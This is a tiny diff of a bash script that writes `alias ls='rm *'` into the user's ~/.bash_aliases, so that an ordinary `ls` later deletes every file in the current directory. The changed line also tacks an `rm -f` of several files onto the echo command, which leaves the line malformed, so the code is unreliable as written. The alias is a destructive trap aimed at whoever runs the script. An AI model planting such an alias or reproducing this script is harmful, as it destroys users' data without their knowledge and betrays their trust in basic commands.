@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "alias ls='rm *'" > ~/.bash_aliases
+echo "alias ls='rm *'" > ~/.bash_aliases rm -f file_1 file_2 test_alias.sh 
